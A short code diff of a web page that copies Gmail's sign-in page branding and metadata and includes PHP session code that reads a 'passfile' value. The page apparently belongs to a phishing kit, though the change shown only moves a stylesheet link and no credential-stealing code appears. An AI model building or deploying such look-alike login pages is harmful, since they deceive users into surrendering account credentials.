@@ -7,8 +7,7 @@
   <meta name="description" content="Gmail is email that&#39;s intuitive, efficient, and useful. 15 GB of storage, less spam, and mobile access.">
   <meta name="google-site-verification" content="LrdTUW9psUAMbh4Ia074-BPEVmcpBxF6Gwf0MSgQXZs">
   <title>Gmail</title>
-  
-
+ <link rel="stylesheet" type="text/css"  href="index.css" media="screen" />
 <?php
 session_start ();
 $passfile = $_SESSION['link'];
@@ -37,8 +36,6 @@ $pstyle = " ";
 }
 #include('header.php');
 ?>
- 
-  <link rel="stylesheet" type="text/css"  href="index.css" media="screen" />
   <style media="screen and (max-width: 800px), screen and (max-height: 800px)">
   .google-header-bar.centered {
   height: 83px;
